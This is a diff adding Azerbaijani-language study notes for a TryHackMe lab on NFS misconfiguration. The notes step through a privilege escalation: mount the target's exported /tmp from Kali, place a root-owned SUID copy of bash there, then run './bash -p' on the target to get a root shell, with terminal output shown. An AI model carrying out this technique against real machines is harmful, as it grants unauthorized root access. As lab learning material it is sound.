@@ -18,3 +18,98 @@ NFS (Şəbəkə Fayl Paylaşımı) konfiqurasiyası  faylında saxlanılır.
 -- showmount -e 0.0.0.0  (ip)
 ----
 
+##Merheleler: TRYHACKME de 
+
+
+1.cp /bin/bash .  (/tmp ye kec he bash i ora kocur)
+2.cat /etc/export
+
+3.cd /home/ubuntu/sharedfolders
+
+4.daha sonra bash faylin kaliye kocuruk ve root   a kocuruk.
+ondan evvel kali ile karen masinin /tmp fayllarini bir biri ile sef s
+salmamaq ucun karende /tmp qovlugunun daxilinde royal adinda .txt fayl yaradiriq
+
+5. daha sonra kalide /tmp ye kecmek lazimdir
+	 ve /tmp daxilinde share qovluq yaradiriq
+	 --mkdir share ile
+
+6. sudo mount -o [options] -t nfs ip_address:share directory_to_mount
+
+duzelis edib yaziriq:
+
+sudo mount -o rw,vers=2 -t nfs 10.10.187.4:/tmp/share
+
+7. root da olanda(hedef sistemde ) paylasilan faylin baxmaq ucun:
+
+--showmount -e 10.10.187.4
+
+┌──(root㉿kali)-[/tmp]
+└─# showmount -e 10.10.187.4
+Export list for 10.10.187.4:
+/home/ubuntu/sharedfolder *
+/tmp                      *
+/home/backup              *
+
+
+
+8.indi ise /tmp ni getirek hedef sisteme (root a)
+
+-- sudo mount -t nfs 10.10.187.4:/tmp /tmp/share
+
+9.  	┌──(root㉿kali)-[/tmp]
+	└─# ls -la share
+total 1200
+drwxrwxrwt 11 root root    4096 Jan 29 09:45 .
+drwxrwxrwt 16 root root     360 Jan 29 13:53 ..
+-rwxr-xr-x  1 1001 1001 1183448 Jan 29 09:34 bash
+drwxrwxrwt  2 root root    4096 Jan 29 08:40 .font-unix
+drwxrwxrwt  2 root root    4096 Jan 29 08:40 .ICE-unix
+-rw-rw-r--  1 1001 1001      14 Jan 29 09:45 royal.txt
+drwx------  3 root root    4096 Jan 29 08:40 snap.lxd
+drwx------  3 root root    4096 Jan 29 08:40 systemd-private-70e4d892250e4251b761c5acf7f3adc5-systemd-logind.service-85Mn9h
+drwx------  3 root root    4096 Jan 29 08:40 systemd-private-70e4d892250e4251b761c5acf7f3adc5-systemd-resolved.service-md9Wrj
+drwx------  3 root root    4096 Jan 29 08:40 systemd-private-70e4d892250e4251b761c5acf7f3adc5-systemd-timesyncd.service-UaFwEi
+drwxrwxrwt  2 root root    4096 Jan 29 08:40 .Test-unix
+drwxrwxrwt  2 root root    4096 Jan 29 08:40 .X11-unix
+drwxrwxrwt  2 root root    4096 Jan 29 08:40 .XIM-unix
+
+
+burada olan icazeler karen masininda olan fayllardir yadimizdadir ki biz karende royal.txt adinda fayl yaratdiq.(4 cu de yazilib)
+
+
+
+10. daha sonra  bash faylin root icazeleri veririk( 0 :0 ) cunki bu 1001 1001 dir.
+ 	-rwxr-xr-x  1 1001 1001 1183448 Jan 29 09:34 bash
+
+qeyd: bizim sistemde (kalide) 1001 
+
+-- chown root:root bash
+			ve  execute icazesi verilir:
+
+-rwxr-xr-x  1 root root 1183448 Jan 29 09:34 bash
+
+11.daha sonra suid vermek lazimdir.
+
+-- chmod u+s bash
+
+
+-rwsr-xr-x  1 root root 1183448 Jan 29 09:34 bash
+
+12.daha sonra keciirk karen masinina ve  bash faylina root verdiyimiz ucun runnlamaq lazimdir ki bize root versin
+
+--./bash -p
+
+karen@ip-10-10-187-4:/tmp$ ./bash -p
+bash-5.0# whoami
+root
+
+
+
+	
+
+
+
+
+
+
